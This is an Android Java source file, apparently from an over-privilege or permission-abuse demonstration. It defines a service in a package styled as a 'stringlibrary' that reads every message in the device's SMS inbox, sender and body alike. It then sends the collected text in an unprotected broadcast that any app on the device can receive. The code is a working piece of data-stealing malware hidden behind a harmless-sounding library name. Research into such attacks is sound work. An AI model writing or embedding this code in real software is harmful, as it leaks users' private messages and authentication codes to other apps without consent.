package overPrivilege.stringlibrary;

import android.annotation.SuppressLint;
import android.app.IntentService;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

public class SmsService extends IntentService {

    public SmsService() {
        super("SmsService");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"),
                new String[]{"_id", "address", "body"}, null, null, null);
        StringBuilder smsBuffer = new StringBuilder();

        if (cursor != null && cursor.moveToFirst()) {
            do {
                @SuppressLint("Range") String address = cursor.getString(cursor.getColumnIndex("address"));
                @SuppressLint("Range") String body = cursor.getString(cursor.getColumnIndex("body"));
                smsBuffer.append("From: ").append(address).append(", Message: ").append(body).append("\n\n");
            } while (cursor.moveToNext());
            cursor.close();
            Log.d("SmsService", "SMS read and broadcast is being sent");
        } else {
            Log.d("SmsService", "No SMS to read or permission not granted");
        }

        // Créer et envoyer un broadcast avec les données des SMS
        Intent sendIntent = new Intent("overPrivilege.vulnerable.SMS_DATA");
        sendIntent.putExtra("sms_data", smsBuffer.toString());
        sendBroadcast(sendIntent);
        Log.d("SmsService", "Broadcast sent");
    }
}